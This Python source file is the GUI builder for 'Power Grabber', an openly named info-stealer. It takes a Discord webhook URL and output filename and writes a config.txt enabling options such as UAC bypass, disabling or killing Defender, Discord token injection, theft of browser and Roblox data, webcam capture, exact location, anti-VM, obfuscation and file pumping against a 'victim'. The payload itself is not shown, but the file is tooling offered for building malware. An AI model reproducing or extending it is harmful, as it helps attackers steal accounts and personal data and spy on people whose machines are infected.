import customtkinter as ctk
import os
from customtkinter import *
from tkinter import *
import requests
from io import BytesIO
from PIL import Image, ImageTk
class Power_Grabber(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title('Power Grabber Builder')
        self.geometry('1000x600')
        self.resizable(False, False)
        ctk.set_appearance_mode('dark')
        ctk.set_default_color_theme("dark-blue")
        ctk.set_widget_scaling(1.0)
        self.main_frame = ctk.CTkFrame(self, fg_color='#1A1A1A', corner_radius=0)
        self.main_frame.pack(side=LEFT, fill=BOTH, expand=True)
        self.sidebar = ctk.CTkFrame(self, width=300, fg_color='#212127', corner_radius=0)
        self.sidebar.pack(side=RIGHT, fill=Y)
        url = "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true"
        ur ="https://github.com/Powercascade/Power-grabber/blob/main/github.png?raw=true"
        u = "https://github.com/Powercascade/Power-grabber/blob/main/discord-logo.png?raw=true"
        URL = "https://github.com/Powercascade/Power-grabber/blob/main/settings.png?raw=true"
        response = requests.get(url)
        image_data = response.content
        image = Image.open(BytesIO(image_data))
        self.logo = ImageTk.PhotoImage(image)
        self.logo_label = ctk.CTkLabel(self.sidebar, image=self.logo, text="")
        self.logo_label.pack(pady=(20, 10))
        settings_response = requests.get(URL)
        settings_image_data = settings_response.content
        settings_image = Image.open(BytesIO(settings_image_data))
        settings_image = settings_image.resize((20, 20))
        self.settings_icon = ImageTk.PhotoImage(settings_image)
        self.options_button = ctk.CTkButton(
            self.sidebar, 
            text="Options", 
            command=self.show_options_page,
            fg_color='#FF3535', 
            hover_color='#FF3535',
            text_color='#000000', 
            font=('Arial', 16, 'bold'),
            image=self.settings_icon, 
            compound="left"
        )
        self.options_button.pack(pady=10)
        self.credits_button = ctk.CTkButton(
            self.sidebar, 
            text="Credits", 
            command=self.show_credits_page,
            fg_color='#FF3535', 
            hover_color='#FF3535',
            text_color='#000000',  
            font=('Arial', 16, 'bold')
        )
        self.credits_button.pack(pady=10)
        self.content_frame = ctk.CTkFrame(self.main_frame, fg_color='transparent')
        self.content_frame.pack(padx=20, pady=20, fill=BOTH, expand=True)
        self.options_page = self.create_options_page()
        self.credits_page = self.create_credits_page()
        github_response = requests.get(ur)
        github_image_data = github_response.content
        github_image = Image.open(BytesIO(github_image_data))
        github_image = github_image.resize((20, 20))
        self.github_icon = ImageTk.PhotoImage(github_image)
        self.github_button = ctk.CTkButton(
            self.sidebar, 
            text="GitHub Repo", 
            command=self.open_github,
            fg_color='#FF3535', 
            hover_color='#FF3535',
            text_color='#000000',
            font=('Arial', 16, 'bold'),
            image=self.github_icon, 
            compound="left"
        )
        self.github_button.pack(pady=10)
        discord_response = requests.get(u)
        discord_image_data = discord_response.content
        discord_image = Image.open(BytesIO(discord_image_data))
        discord_image = discord_image.resize((20, 20))
        self.discord_icon = ImageTk.PhotoImage(discord_image)
        self.discord_button = ctk.CTkButton(
            self.sidebar, 
            text="Join Discord", 
            command=self.join_discord,
            fg_color='#FF3535', 
            hover_color='#FF3535',
            text_color='#000000',
            font=('Arial', 16, 'bold'),
            image=self.discord_icon, 
            compound="left"
        )
        self.discord_button.pack(pady=10)
        self.support_button = ctk.CTkButton(
            self.sidebar, 
            text="Contact Support", 
            command=self.contact_support,
            fg_color='#FF3535', 
            hover_color='#FF3535',
            text_color='#000000',
            font=('Arial', 16, 'bold')
        )
        self.support_button.pack(pady=10)
        self.login_button = ctk.CTkButton(
            self.sidebar,
            text="Login",
            fg_color='#FF3535',
            hover_color='#FF3535',
            text_color='#000000',
            font=('Arial', 16, 'bold')
        )
        self.login_button.pack(pady=10)
        self.free_vbucks_button = ctk.CTkButton(
            self.sidebar, 
            text="FrEe VbUcKs!11!1", 
            command=self.open_free_vbucks_link, 
            fg_color='#FF3535', 
            hover_color='#FF3535', 
            text_color='#000000',
            font=('Arial', 16, 'bold')
        )
        self.free_vbucks_button.pack(pady=10)
    def create_options_page(self):
        page = ctk.CTkFrame(self.content_frame, fg_color='transparent')
        def on_hover(event, widget):
            widget.configure(border_width=4)
            widget.configure(border_color="#FF3535")
        def off_hover(event, widget):
            widget.configure(border_width=3)
            widget.configure(border_color="#FF3535")
        webhook_entry = ctk.CTkEntry(
            page,
            width=600,
            height=45,
            fg_color='#333333',
            text_color='white',
            placeholder_text='Enter Webhook URL:',
            placeholder_text_color='lightgray',
            border_width=3,
            corner_radius=20,
            border_color='#FF3535', 
            font=('Arial', 14, 'bold')
        )
        webhook_entry.pack(pady=(15, 15))
        webhook_entry.bind("<Enter>", lambda e: on_hover(e, webhook_entry))
        webhook_entry.bind("<Leave>", lambda e: off_hover(e, webhook_entry))
        filename_entry = ctk.CTkEntry(
            page,
            width=600,
            height=45,
            fg_color='#333333',
            text_color='white',
            placeholder_text="File name (don't type extension)",
            placeholder_text_color='lightgray',
            border_width=3,
            corner_radius=20,
            border_color='#FF3535', 
            font=('Arial', 14, 'bold')
        )
        filename_entry.pack(pady=(15, 25))
        filename_entry.bind("<Enter>", lambda e: on_hover(e, filename_entry))
        filename_entry.bind("<Leave>", lambda e: off_hover(e, filename_entry))
        options_label = ctk.CTkLabel(page, text='Options:', 
                                    font=('Arial', 24, 'bold', 'italic'),
                                    text_color='white')
        options_label.pack(pady=(0, 10))
        hr = ctk.CTkFrame(page, height=2, width=400, fg_color='#FF3535', 
                        border_width=1,
                        border_color='#FF3535',
                        corner_radius=5)
        hr.pack(pady=(0, 10))
        checkbox_options = [
            'Anti VM', 'Annoy Victim (Audio)', 'Browser Info', 'Clipboard contents',
            'Disable defender (Needs UAC Bypass)', 'Discord Info', 'Discord Injection', 'Exact location',
            'Games info', 'Kill defender (Needs UAC Bypass)', 'Obfuscate', 'Roblox account', 'Self destruction',
            'Self exclusion', 'Screenshot', 'System info',
            'UAC Bypass', 'Vulnerable port creation', 'Webcam', 'Watch Dog'
        ]
        checkbox_frame = ctk.CTkFrame(page, fg_color='transparent')
        checkbox_frame.pack(fill=X)
        checkbox_dict = {}
        for i, option in enumerate(checkbox_options):
            row = i // 3
            col = i % 3
            checkbox = ctk.CTkCheckBox(checkbox_frame, text=option, width=200, height=32,
                                                fg_color='#FF3535', text_color='white', 
                                                border_color='#FF3535', corner_radius=16,
                                                hover_color='#FF3535',
                                                checkmark_color='#FFFFFF',
                                                border_width=1,
                                                font=('Arial', 12, 'bold', 'italic'),
                                                text_color_disabled='gray',
                                                hover=True)
            checkbox.grid(row=row, column=col, padx=10, pady=5, sticky='w')
            checkbox_dict[option] = checkbox
        anti_vm_checkbox = checkbox_dict['Anti VM']
        annoy_victim_checkbox = checkbox_dict['Annoy Victim (Audio)']
        browser_info_checkbox = checkbox_dict['Browser Info']
        clipboard_contents_checkbox = checkbox_dict['Clipboard contents']
        disable_defender_checkbox = checkbox_dict['Disable defender (Needs UAC Bypass)']
        discord_info_checkbox = checkbox_dict['Discord Info']
        discord_injection_checkbox = checkbox_dict['Discord Injection']
        exact_location_checkbox = checkbox_dict['Exact location']
        games_info_checkbox = checkbox_dict['Games info']
        kill_defender_checkbox = checkbox_dict['Kill defender (Needs UAC Bypass)']
        obfuscate_checkbox = checkbox_dict['Obfuscate']
        roblox_account_checkbox = checkbox_dict['Roblox account']
        screenshot_checkbox = checkbox_dict['Screenshot']
        self_destruct_checkbox = checkbox_dict['Self destruction']
        self_exclusion_checkbox = checkbox_dict['Self exclusion']
        system_info_checkbox = checkbox_dict['System info']
        uac_bypass_checkbox = checkbox_dict['UAC Bypass']
        vulnerable_port_creation_checkbox = checkbox_dict['Vulnerable port creation']
        watchdog_checkbox = checkbox_dict['Watch Dog']
        webcam_checkbox = checkbox_dict['Webcam']
        pumper_frame = ctk.CTkFrame(page, fg_color='transparent')
        pumper_frame.pack(fill=X, pady=(20, 0))
        pumper_label = ctk.CTkLabel(pumper_frame, text='File Pumper (MB):', 
                                    font=('Arial', 16))
        pumper_label.pack(side=LEFT, padx=(0, 10))
        pumper_combo = ctk.CTkComboBox(pumper_frame, values=['None', '5', '10'], width=100, height=32, 
                                    fg_color='#FF3535', text_color='white', border_color='#FF3535', 
                                    corner_radius=12, state="readonly", button_color='#FF3535', button_hover_color='#FF3535')
        pumper_combo.pack(side=LEFT, padx=(0, 10), pady=(5, 5))
        ping_label = ctk.CTkLabel(pumper_frame, text='Ping:  ', font=('Arial', 16))
        ping_label.pack(side=LEFT, padx=(10, 0))
        ping_combo = ctk.CTkComboBox(pumper_frame, values=['None', 'Here', 'Everyone'], width=100, height=32, 
                                    fg_color='#FF3535', text_color='white', border_color='#FF3535', 
                                    corner_radius=12, state="readonly", button_color='#FF3535', button_hover_color='#FF3535')
        ping_combo.pack(side=LEFT, padx=(10, 0), pady=(5, 5))
        spacer = ctk.CTkFrame(pumper_frame, width=20, fg_color='transparent')
        spacer.pack(side=LEFT, fill=X, expand=True)
        def build_button_clicked(event):
            webhook_url = webhook_entry.get()
            file_name = filename_entry.get()
            checkbox_statuses = {
        "Annoy-Victim": bool(annoy_victim_checkbox.get()),
        "Anti-VM": bool(anti_vm_checkbox.get()),
        "Browser-Info": bool(browser_info_checkbox.get()),
        "Clipboard": bool(clipboard_contents_checkbox.get()),
        "Disable-Defender": bool(disable_defender_checkbox.get()),
        "Discord-Info": bool(discord_info_checkbox.get()),
        "Discord-Injection": bool(discord_injection_checkbox.get()),
        "Exact-location": bool(exact_location_checkbox.get()),
        "Games-Info": bool(games_info_checkbox.get()),
        "Kill-Defender": bool(kill_defender_checkbox.get()),
        "Obfuscate": bool(obfuscate_checkbox.get()),
        "Roblox-Account": bool(roblox_account_checkbox.get()),
        "Self-destruction": bool(self_destruct_checkbox.get()),
        "Self-exclusion": bool(self_exclusion_checkbox.get()),
        "Screenshot": bool(screenshot_checkbox.get()),
        "System-Info": bool(system_info_checkbox.get()),
        "UAC-Bypass": bool(uac_bypass_checkbox.get()),
        "Vulnerable-port-creation": bool(vulnerable_port_creation_checkbox.get()),
        "Webcam": bool(webcam_checkbox.get()),
        "Watch-Dog": bool(watchdog_checkbox.get()),
        "Filepumper-Value": pumper_combo.get(),
        "Ping": ping_combo.get(),
            }

            with open("config.txt", "w") as file:
                file.write(f'Webhook: "{webhook_url}"\n')
                file.write(f'File-Name: "{file_name}.py"\n')

                for option, status in checkbox_statuses.items():
                    file.write(f'{option}: {status}\n')
        build_button = ctk.CTkButton(pumper_frame, text="Build", width=200, height=40,
                                    fg_color='#FF3535', hover_color='#FF3535',
                                    font=('Arial', 18, 'bold'))
        build_button.bind("<Button-1>", build_button_clicked)
        build_button.pack(side=RIGHT, padx=(0, 10))
        return page
    def create_credits_page(self):
        page = ctk.CTkFrame(self.content_frame, fg_color='transparent')
        credits_label = ctk.CTkLabel(page, text="Credits", font=('Arial', 24, 'bold'))
        credits_label.pack(pady=(0, 20))
        credits_text = """
        Thanks to the following people for their contributions:
        - The Developers:
        - Taktikal.exe: Provided crucial code for this project
        - Powercascade: Started the project and made most of the code

        - The Helpers:
        - TheOneWhoWatches: Paid Powercascade $20 to make this project and gave him the idea to make premium

        - Special thanks:
        - You, the user: For using Power Grabber. If you have any issues, please contact Powercascade on Discord.

        - Existing:
        - LLucas1425
        """
        credits_textbox = ctk.CTkTextbox(page, width=700, height=500, fg_color='#212127', text_color='white')
        credits_textbox.pack(pady=10)
        credits_textbox.insert("1.0", credits_text)
        credits_textbox.configure(state="disabled")
        return page
    def show_options_page(self):
        self.credits_page.pack_forget()
        self.options_page.pack(fill=BOTH, expand=True)
    def show_credits_page(self):
        self.options_page.pack_forget()
        self.credits_page.pack(fill=BOTH, expand=True)
    def open_github(self):
        os.system("start https://github.com/Powercascade/Power-grabber")
    def join_discord(self):
        os.system("start https://discord.gg/FzvXRxNzM2")
    def contact_support(self):
        os.system("start https://discord.gg/QmtjEGDzBf")
    def open_free_vbucks_link(self):
        os.system("start https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        self.show_options_page()
    
if __name__ == '__main__':
    app = Power_Grabber()
    app.mainloop()
    
